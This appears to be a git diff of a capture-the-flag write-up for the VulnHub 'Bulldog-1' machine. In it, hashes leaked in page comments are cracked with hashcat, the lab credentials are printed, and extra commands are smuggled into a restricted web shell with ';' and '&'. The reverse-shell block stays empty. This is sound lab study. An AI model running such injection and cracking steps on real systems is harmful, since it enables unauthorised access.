@@ -98,7 +98,7 @@ And when trying to go to the "Web-Shell" link, what I get is:
 
 Meaning that i must authenticate (probably happens in the /admin/ directory found by gobuster) in order to access this page.
 
-When viewing the /dev/ page source, I find the following commented out:
+When viewing the /dev/ page source, I find the following information commented out:
 
 ```html
 <!--Need these password hashes for testing. Django's default is too complex-->
@@ -115,6 +115,53 @@ Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c044
 So i copy all these hashes into a file named 'hashes.txt', and run:
 ```bash
 ┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1]
-└─$ hashcat -m 100 -a 0 -o cracked_hashes.txt hashes.txt /home/j/Desktop/wordlists/SecLists/rockyou.txt
+└─$ sudo hashcat -m 100 -a 0 -o cracked_hashes.txt hashes.txt /home/j/Desktop/wordlists/SecLists/rockyou.txt
 ```
 
+And they read as:
+```bash
+┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1]
+└─$ sudo cat cracked_hashes.txt
+ddf45997a7e18a25ad5f5cf222da64814dd060d5:bulldog
+d8b8dd5e7f000b8dea26ef8428caf38c04466b3e:bulldoglover
+```
+
+So, cross-referencing the cracked hashes to the comments, I get that username 'sarah' has password 'bulldoglover' and username 'nick' has password 'bulldog'.
+When I go to the '/admin/' directory, it redirects me to '/admin/login/?next=/admin/', and  I'm presented to:
+
+![bulldog 4](./images/bulldog-4.png)
+
+I proceed to log-in with Username 'sarah' and Password 'bulldoglover'. After that I go to '/dev/' again, click on the "Web-Shell" link, and am redirected to:
+
+![bulldog 5](./images/bulldog-5.png)
+
+I seem to be able to run only the commands allowed, when i try to ping back my host machine, what i get is:
+
+![bulldog 6](./images/bulldog-6.png)
+
+But as it is well known, we can use ';' to run one command and then the next, one, so trying "pwd; whoami":
+
+![bulldog 7](./images/bulldog-7.png)
+
+But there is another way, using and ampersand, so, running "pwd & whoami":
+
+![bulldog 8](./images/bulldog-8.png)
+
+And I get the info that the user serving the page is 'django', and also that the string sent is not clean enough, allowing for the ampersand to pass. So i proceed to plan a reverse shell. I check to see if the machine has php, by running
+
+```bash
+pwd& which php
+```
+
+But the server returns status 500, which I think means that it doesn't have php installed. So i run:
+
+```bash
+pwd& which python3
+```
+
+And it returns the path to python3, which has a one-liner for reverse shell. So I run:
+
+```bash
+
+```
+ 
